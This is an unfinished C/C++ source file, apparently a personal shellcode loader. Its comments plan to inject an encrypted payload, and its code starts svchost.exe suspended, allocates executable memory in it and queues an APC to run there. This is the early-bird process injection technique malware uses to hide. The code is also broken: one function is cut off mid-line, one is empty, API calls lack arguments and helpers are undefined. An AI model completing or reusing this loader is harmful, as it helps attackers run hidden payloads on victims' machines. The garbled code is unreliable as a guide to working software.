
#include <stdio.h>
#include "main.h"

#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)




//
//
//
//
//
// import the right functions to pause / unpause thread
// - suspend current process
// - allocate new memory
// - inside new memory, dump shellcode
// - resume current process
//2 - write actual logic to do the fuck ass thread shit to get acccess to the process
//3 - drop my ENCRYPTED payload by xor or by double aes decrpyt encrpyt
// 4 - profit



size_t GetModHandle() {
	PEB *pPeb = (PEB *)__readfsword

}

size_t GetFuncAddr() {


}
int Decrypter(unsigned char* payload, DWORD payloadlen, char* key, size_t keylength ) {

	HCRYPTKEY hKey;
	HCRYPTHASH hHash;
	HCRYPTPROV hProv;

	BOOL acq = CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
	if (acq == false) {

		e("CryptAcquireContext failed %d\n", GetLastError());
	}

	BOOL create = CryptCreateHash();
	if (create == false) {

		e("create hash  failed %d\n", GetLastError());
	}

	return 0;
}



int main(int argc, char** argv, char* envp){


	pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
	if (pCreateProcessW == NULL) {

		e("Failed to load kernel32.dll");
	}

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	RtlZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	RtlSecureZeroMemory(&pi, sizeof(pi));

	std::wstring pName = L"C:\\Windows\\System32\\svchost.exe";

	HANDLE pHandle = NULL;
	HANDLE hThread = NULL;
	DWORD Pid = 0;

	BOOL cProcess = pCreateProcessW(NULL, &pName[0],NULL,NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	pHandle = pi.hProcess;
	hThread = pi.hThread;
	Pid = pi.dwProcessId;



	LPVOID memAlloc = pVirtualAlloc(pHandle, 0, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
		pResumeThread(hThread);
	}

	return 0;
	


}
